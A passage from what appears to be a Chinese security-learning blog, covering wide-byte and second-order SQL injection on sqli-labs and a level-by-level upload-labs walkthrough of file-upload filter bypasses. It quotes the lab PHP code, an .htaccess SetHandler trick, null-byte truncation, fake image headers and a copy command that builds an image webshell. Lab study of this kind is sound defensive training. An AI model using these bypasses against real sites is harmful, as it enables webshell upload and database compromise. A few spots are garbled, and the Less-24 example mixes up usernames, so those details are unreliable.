尝试使用%df让反斜杠失去转义的作用（刚开始我们并不知道编码格式是否为gbk，所以只能说是一种尝试）；提交id=%df'，发现页面报错，并提示提交的内容变成df5c27，现在还不能完全确定反斜杠没有起作用； 提交id=1%df'--+，发现结果与提交id=1的结果相同，所以说单引号起到了闭合作用，也就是反斜杠失去了转义的作用，即存在宽字节注入。然后构造payload一路爆库，爆表，爆字段。 源码分析： 自定义的check_addslashes()函数用于检索url中的特殊字符（例如：\\,'）。 UTF-8 GBK UTF8 GB2312之间的区别和关系 宽字节注入详解 二、二次注入原理分析： 一般应用程序为了防止SQL注入，会对提交到服务端的内容中的特殊字符进行过滤，常用的过滤方法是对特殊字符进行转义。但如果将提交的内容存放到数据库，那么存入数据库中的内容就不是转义后的内容，而是提交的内容。如果web应用程序从数据库中取出这个数据时，那么取出的数据就是用户第一步所提交的内容；此时，如果没有在提取数据时进行过滤，就会将用户提交的恶意数据拼接到SQL语句中，从而造成数据被泄露、修改、删除等等。这就是二次注入。 为什么不直接将转义之后的内容存入数据库呢？ 因为数据库中的部分数据是需要直接展示给用户的。当你在某网站注册成为用户时，网站就会将你的用户名、账号和密码存储在数据库中，当你登录账号时，一般会在网页上显示你的用户名，而此时的用户名，就是从数据库中取出来的。如果没有对取出的数据进行过滤，就会造成二次注入。例如，你注册的用户名为admin' #，可能网站会检查用户名是否已被注册，就会用到SQL查询：select * from users where user_name = 'admin' #'，可见，如果直接将用户提交的内容拼接到SQL语句中，就会造成SQL注入。经过过滤后，SQL语句变成：select * from users where user_name = 'admin\\' \\#'，就不会造成危害。此时，如果注册成功，用户名admin' #就会被存放到数据库中，而不是admin\\' #'，当应用程序再次查询此用户时，如果没有进行过滤，SQL语句就是select * from users where user_name = 'admin' #'，还是会导致SQL注入，只不过这是二次注入。 思考： 如果直接将转义后的内容存入数据库，当查询时可以再去掉反斜杠，应该也能避免二次注入。但也有可能会拖慢程序运行，数据库不利于管理等问题。 实战（以Less-24为例）： 首先是一个页面，具有注册、登录和修改密码的功能。往往网站功能越强大，面临的风险也就越多; 先正常注册一个用户，用户名为test，密码为123；然后再查看数据库，发现用户名已被收录； 现在就要使用二次注入来尝试修改test账号的密码，首先注册一个用户，因为已知为单引号注入，所以设置用户名为test‘ #，密码随便填，这里我还是设置为123； 登录test' #，修改密码为147，然后查看数据库，发现test账号的密码变成了147。这是因为修改密码时，SQL语句为UPDATE users SET passwd=&quot;147&quot; WHERE username ='admin' #' AND password=9562'，其实也就是执行了UPDATE users SET passwd=&quot;147&quot; WHERE username ='admin'，成功绕过了密码检查。","link":"/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E5%92%8C%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/"},{"title":"验证码安全","text":"","link":"/%E9%AA%8C%E8%AF%81%E7%A0%81%E5%AE%89%E5%85%A8/"},{"title":"文件上传","text":"文件上传一、文件上传漏洞原理网站的一些Web应用具有文件上传的功能，如上传头像，文档，视频。当网站没有对用户上传文件的类型进行严格的检查，会导致攻击者能够上传非法文件，如webshell，从而能够对网站进行更进一步的攻击，如恶意代码执行，操作数据库，权限提升等等。还有一部分攻击者通过Web服务器的解析漏洞来绕过网站的检查。 二、文件上传的防御及各种绕过 文件绕过检查后，可能格式会发生改变，不是php格式，这个时候需要使用文件包含来解析文件，因为这样文件会按php格式解析。 客户端： js检查——绕过：bp抓包修改后缀。 服务端： 检查后缀； (1)黑名单检查； ​ 绕过: ​ ①上传特殊可解析后缀，如php2； ​ ②上传.htaccess，修改文件解析方式； ​ ③后缀大小写绕过，如phP； ​ ④点绕过，如.php.； ​ ⑤空格绕过，如.php （空格）； ​ ⑥::$DATA 绕过，如.php::$DATA； ​ ⑦配合解析漏洞； ​ Apache陌生后缀解析漏洞； ​ Apache换行解析漏洞； ​ ⑧双写后缀绕过，如.phphpp。 (2)白名单检查； ​ 绕过： ​ ①MINE绕过，修改Content-Type字段； ​ ②%00截断； ​ ③0x00截断。 检查内容； (1)文件头检查，添加头文件; (2)突破getimagesize()； (3)突破exif_imagetype()； (4)二次渲染 代码逻辑； (1)条件竞争； 三、实践（upload-labs） php在上传文件的时候会创建一个表单来支持文件上传。 表单内容： 123456&lt;form enctype=\"multipart/form-data\" action=\"upload.php\" method=\"post\"&gt; &lt;input type=\"hidden\" name=\"MAX_FILE_SIZE\" value=\"1000\"&gt; &lt;input name=\"myFile\" type=\"file\"&gt; &lt;input type=\"submit\" value=\"上传文件\"&gt; &lt;/form&gt; //upload.php中可以直接使用$_FILES,$_POST,$_GET等全局变量来获取表单内容； Pass-01（客户端js检查）源码： 1234567891011121314151617function checkFile() { var file = document.getElementsByName('upload_file')[0].value; if (file == null || file == \"\") { alert(\"请选择要上传的文件!\"); return false; } //定义允许上传的文件类型 var allow_ext = \".jpg|.png|.gif\"; //提取上传文件的类型 var ext_name = file.substring(file.lastIndexOf(\".\")); //判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name + \"|\") == -1) { var errMsg = \"该文件不允许上传，请上传\" + allow_ext + \"类型的文件,当前文件类型为：\" + ext_name; alert(errMsg); return false; }} 只允许上传图片。先直接上传php木马文件，发现前端页面报错； 猜测应该是客户端js检查，一般客户端检查响应时间会比服务端稍微短一些；先上传伪木马图片，然后再使用bp抓包，修改文件后缀名后再上传； 成功上传。 Pass-02（服务器端MINE检查）源码： 12345678910111213141516171819$is_upload = false;$msg = null;if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name'] if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '文件类型不正确，请重新上传！'; } } else { $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！'; }} $_FILES['upload_file']['type']表示文件的MINE类型，所以应该是服务端MINE检查。MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的因特网标准。服务端进行MINE检查的时候会检查http请求中的Content-Type字段，所以bp抓包，修改请求的Content-Type字段为要求的类型即可。 要注意的是前面一个Content-Type: multipart/form-data;是在表单中上传文件所使用的格式；后面一个Content-Type: application/octet-stream是指二进制数据流，这个才是指我们所上传的文件内容的格式，也就是需要修改的部分。 Pass-03（特殊可解析后缀绕过）源码： 123456789101112131415161718192021222324252627$is_upload = false;$msg = null;if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array('.asp','.aspx','.php','.jsp'); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.');//截取后缀名 $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if(!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; }} trim： 移除字符串两侧的空白字符或其他预定义字符 ；strrchr：查找某个字符串在另一个字符串中最后一次出现的位置，并返回从该位置到字符串结尾的所有字符。 黑名单检查，禁止上传以.asp、.aspx、.php、.jsp为后缀的文件，并排除空格绕过，点绕过，大小写绕过，::$DATA绕过等，所以采用特殊可解析后缀绕过。服务器除了可以解析以.asp、.aspx、.php、.jsp为后缀的文件外，还支持其他后缀,如.asa、.asax、.asmx、.php2、.php3、.php4、.php5、.phtml、.phtm、.jspa、.jspx、.jsw等。 使用bp抓包，修改后缀名绕过； 检查是否上传成功。发现文件名并不是我们想要的结果，再看一下源码，发现$img_path = UPLOAD_PATH.'/'.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;利用日期和生成的随机数对上传的文件进行了重命名，date()函数生成时间，YmdHis分别对应年月日时分秒；rand(1000,9999)生成一个在1000到9999之间的随机数。这时候我们可以查看服务器的返回内容，一般上传的文件会显示在页面上； 得到文件名为202002161753074796.php2； 但如果页面没有显示上传的文件，就难搞哦！ Pass-04（.htaccess文件绕过）源码： 123456789101112131415161718192021222324252627$is_upload = false;$msg = null;if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".php1\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".pHp1\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".ini\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '此文件不允许上传!'; } } else { $msg = U![9](文件上传/9.png)PLOAD_PATH . '文件夹不存在,请手工创建！'; }} 黑名单检查，基本所以的后缀都过滤掉了，但是没有过滤掉 .htaccess。 先上传一个后缀为.htaccess的文件，文件内容为： 1SetHandler application/x-httpd-php 这样上传的所有文件都会被解析成php文件；上传1.htaccess，然后bp抓包，删除文件名后再上传，然后再上传伪木马图片，即可。 当访问文件webshell.jpg时，文件就自动下载解析，说明上传成功。 Pass-05（.user.ini）源码： 123456789101112131415161718192021222324252627$is_upload = false;$msg = null;if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '此文件类型不允许上传！'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; }} 黑名单检查。基本上对所有的后缀进行了过滤，但没有过滤.ini，而且题目提示上传目录存在php文件（readme.php）。这时候可以利用.user.ini来绕过。借助.user.ini可以让所有php文件都自动包含某个文件，而且这个文件可以是webshell。 我们可以先上传一个.user.ini，让目录中的所有php文件都包含伪木马图片，然后再上传伪木马，最后访问php文件就可以运行木马了； 但奇怪的是文件并没有被包含。。。 相关链接： https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html https://segmentfault.com/a/1190000011552335?utm_source=tag-newest Pass-06（大小写绕过）源码： 1234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\",\".ini\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '此文件类型不允许上传！'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; }} 黑名单检查，虽然过滤了所有后缀，但没有统一大小写，而且后缀名不区分大小写，所以可以用大小写绕过。 上传webshell.php文件，bp抓包改后缀； 查看返回内容，获得文件储存路径； Pass-07（空格绕过）源码： 1234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\",\".ini\"); $file_name = $_FILES['upload_file']['name']; $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '此文件不允许上传'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; }} 黑名单检查，发现没有过滤空格，所以可以使用空格绕过，因为在.php的最后添加一个空格效果与.php相同。 先上传webshell.php文件，然后再用bp抓包，添加空格； 查看返回内容，获得文件储存路径； 最后检查是否上传成功，发现上传到服务器的文件后缀名中并没有空格，访问上传的文件，无论有没有加空格，都能访问到。 Pass-08（点绕过）源码： 1234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\",\".ini\"); $file_name = trim($_FILES['upload_file']['name']); $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '此文件类型不允许上传！'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; }} 黑名单检查，发现没有对后缀名后面的点进行过滤，因为在Windows中.php=.php.，所以可以采用点绕过。 先上传webshell.php，然后使用bp抓包，修改后缀名为.php.； 检查是否上传成功，发现上传后的文件后缀名没有点。 Pass-09（::$DATA绕过）源码： 1234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\",\".ini\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '此文件类型不允许上传！'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; }} 黑名单检查。发现没有过滤::$DATA，可以使用::$DATA过滤，在Windows系统中，文件名后面加上::$DATA就表示把::$DATA后面的数据当成文件流来处理，不会检查后缀名，并且会保留::$DATA前面的文件名。 相关链接： 在后缀名追加::$DATA绕过文件上传检测，那个::$DATA是什么？ NTFS文件流的特性以及实现原理讨论。 先上传webshell.php，然后再用bp抓包，在文件名后面加上::$DATA； 因为php代码修改了文件名，所以需要查看服务器的返回内容，来获得文件名； 最后检查是否上传成功，发现文件名中不包括::$DATA。 Pass-10（解析漏洞）源码： 123456789101112131415161718192021222324252627$is_upload = false;$msg = null;if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\",\".ini\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '此文件类型不允许上传！'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; }} 黑名单检查，几乎对所有的后缀进行了过滤，只允许上传jpeg，png，gif格式的文件。也对其他的绕过方法进行了过滤，基本没有其他很明显的绕过，这时候就要考虑结合Apache的解析漏洞来进行绕过。Apache解析文件名后缀的特性是从后往前解析，直到碰到可以解析的后缀，否则会按照默认的文件格式进行解析。而对于浏览器和php来说，是从前往后的查询文件后缀的，这就提供了一种绕过方法。不过这个得要求是黑名单过滤，如果是白名单，那就可能无法绕过。因为白名单中预定义的格式服务器基本都能解析。 我们上传webshell.php.xxx，对于浏览器和php来说，这是一个后缀为.xxx的文件，而对于服务器来说，这是一个php文件； 上传成功后，直接访问的话是不会执行php代码，这时候使用文件包含来执行一句话木马。 Apache除了未知后缀解析漏洞，还有换行解析漏洞；什么是换行解析漏洞？比如，一个文件的后缀为.php.\\x0a，\\x0a表示换行，所有的ASCII码都可以用转义字符（\\）加数字（一般是8进制数字）来表示。对于Apache来说，这个后缀就会被判断为是.php。但本题不可以使用这种方法，因为$_FILES['upload_file']['name']会自动将\\x0a去掉。 相关连接： https://blog.csdn.net/qq_32434307/article/details/79480316 https://blog.csdn.net/xiwangyizhicunzai/article/details/83315758 https://www.cnblogs.com/leixiao-/p/10223090.html http://blog.sina.com.cn/s/blog_9eb8a6a70100zc03.html Pass-11（双写后缀绕过）源码： 12345678910111213141516171819$is_upload = false;$msg = null;if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\"php\",\"php5\",\"php4\",\"php3\",\"php2\",\"html\",\"htm\",\"phtml\",\"pht\",\"jsp\",\"jspa\",\"jspx\",\"jsw\",\"jsv\",\"jspf\",\"jtml\",\"asp\",\"aspx\",\"asa\",\"asax\",\"ascx\",\"ashx\",\"asmx\",\"cer\",\"swf\",\"htaccess\",\"ini\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = str_ireplace($deny_ext,\"\", $file_name); $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; }} 黑名单检查。$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);将文件名中的敏感后缀替换为空，这里可以使用双写后缀名绕过。 先上传webshell.php，然后再用bp抓包，双写后缀后再上传； 上传成功。 ) Pass-12（%00截断）源码： 123456789101112131415161718$is_upload = false;$msg = null;if(isset($_POST['submit'])){ $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\".\")+1); if(in_array($file_ext,$ext_arr)){ $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_GET['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = '上传出错！'; } } else{ $msg = \"只允许上传.jpg|.png|.gif类型文件！\"; }} 白名单检查，但是使用get传参来获取变量save_path的值，并且save_path的值与文件路径相关，所以可以使用00截断修改url来绕过函数的检测。 先上传webshell.jpg，然后用bp抓包，修改变量save_path的值，使用%00截断； 成功上传。 Pass-13（0x00截断）源码： 123456789101112131415161718$is_upload = false;$msg = null;if(isset($_POST['submit'])){ $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\".\")+1); if(in_array($file_ext,$ext_arr)){ $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_POST['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = \"上传失败\"; } } else { $msg = \"只允许上传.jpg|.png|.gif类型文件！\"; }} 白名单检查，还是使用00截断，save_path的值也还是表示文件路径的一部分，与上一题不同的是变量save_path的值是通过post方法获得的，所以save_path是放在请求内容中的，必须要修改对应的十六进制代码才行。 先上传webshell.jpg，然后使用bp抓包，修改save_path的值，注意是要修改对应的十六进制文件。修改的时候有个小技巧就是在文件名后面加一个空格，空格的十六进制代码是20，方便我们找到对应的位置来修改代码； 上传成功。 Pass-14（文件头检查）源码： 12345678910111213141516171819202122232425262728293031323334353637383940function getReailFileType($filename){ $file = fopen($filename, \"rb\"); $bin = fread($file, 2); //只读2字节 fclose($file); $strInfo = @unpack(\"C2chars\", $bin); $typeCode = intval($strInfo['chars1'].$strInfo['chars2']); $fileType = ''; switch($typeCode){ case 255216: $fileType = 'jpg'; break; case 13780: $fileType = 'png'; break; case 7173: $fileType = 'gif'; break; default: $fileType = 'unknown'; } return $fileType;}$is_upload = false;$msg = null;if(isset($_POST['submit'])){ $temp_file = $_FILES['upload_file']['tmp_name']; $file_type = getReailFileType($temp_file); if($file_type == 'unknown'){ $msg = \"文件未知，上传失败！\"; }else{ $img_path = UPLOAD_PATH.\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_type; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = \"上传出错！\"; } }} 文件头检查。unpack(&quot;C2chars&quot;, $bin) 函数表示将$bin存储的二进制字符串转换为无符号字符；intval($strInfo['chars1'].$strInfo['chars2'])函数获取变量的整数值；php通过读取文件头部两个字节判断文件的真实类型。 相关链接： https://www.w3school.com.cn/php/func_misc_unpack.asp 法一：可以在上传的文件中加入jpg、png或gif的文件头绕过： 12345678各种图片文件头标识分析1.JPEG(jpg)文件头识别(3bytes)：ff,d8,ff（十六进制）2.PNG(png)文件头标识(8bytes)：89,50,4e,47,0d,0a,1a,0a3.GIF(gif)文件头标识(6bytes)：47,49,46,38,39(37),61 G, I, F, 8, 9(7) ,a 先上传webshell.php，然后再用bp抓包，在文件内容前面加上jpg图片格式的头文件，这里只用加上2bytes，因为php只读前两个字节。先在文件内容前面加上两个空格，然后再修改对应的十六进制代码； 修改好后可以看到文件内容前面多了两个字符，因为编码的问题不能识别；这里要注意的是文件头必须要加在文件内容当中，也就是加的位置要与Content_type: application/octet-stream隔一行； 查看文件保存路径； 上传成功。 法二： 我们可以不加文件头，直接生成一个图片马。生成方法： 准备一张图片（test.jpg）和木马文件（这里用webshell.php代替），并将它们放在同一个目录下；然后再cmd窗口执行命令：copy test.jpg /b + webshell.php /a shell.jpg，然后目录下就会生成名为shell.jpg的图片马； 最后上传图片马即可，虽然一句话木马是放在图片中的，但任能被php解析，而不能被php解析的图片的二进制代码，将会直接显示在页面上。 123456789101112131415161718192021222324252627282930cmd copy命令：copy /?将一份或多份文件复制到另一个位置。COPY [/D] [/V] [/N] [/Y | /-Y] [/Z] [/L] [/A | /B ] source [/A | /B] [+ source [/A | /B] [+ ...]] [destination [/A | /B]] source 指定要复制的文件。 /A 表示一个 ASCII 文本文件。 /B 表示一个二进位文件。 /D 允许解密要创建的目标文件 destination 为新文件指定目录和/或文件名。 /V 验证新文件写入是否正确。 /N 复制带有非 8dot3 名称的文件时， 尽可能使用短文件名。 /Y 不使用确认是否要覆盖现有目标文件 的提示。 /-Y 使用确认是否要覆盖现有目标文件 的提示。 /Z 用可重新启动模式复制已联网的文件。/L 如果源是符号链接，请将链接复制 到目标而不是源链接指向的实际文件。命令行开关 /Y 可以在 COPYCMD 环境变量中预先设定。这可能会被命令行上的 /-Y 替代。除非 COPY命令是在一个批处理脚本中执行的，默认值应为在覆盖时进行提示。要附加文件，请为目标指定一个文件，为源指定数个文件(用通配符或 file1+file2+file3 格式)。 相关链接： https://www.cnblogs.com/zzb-Dream-90Time/p/10174429.html https://blog.csdn.net/weixin_33774308/article/details/93246777 https://blog.csdn.net/Key_book/article/details/80610349 Pass-15（getimagesize())源码： 12345678910111213141516171819202122232425262728293031function isImage($filename){ $types = '.jpeg|.png|.gif'; if(file_exists($filename)){ $info = getimagesize($filename); $ext = image_type_to_extension($info[2]); if(stripos($types,$ext)&gt;=0){ return $ext; }else{ return false; } }else{ return false; }}$is_upload = false;$msg = null;if(isset($_POST['submit'])){ $temp_file = $_FILES['upload_file']['tmp_name']; $res = isImage($temp_file); if(!$res){ $msg = \"文件未知，上传失败！\"; }else{ $img_path = UPLOAD_PATH.\"/\".rand(10, 99).date(\"YmdHis\").$res; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = \"上传出错！\"; } }} getimagesize($filename)函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回FALSE并产生一条E_WARNING级的错误信息 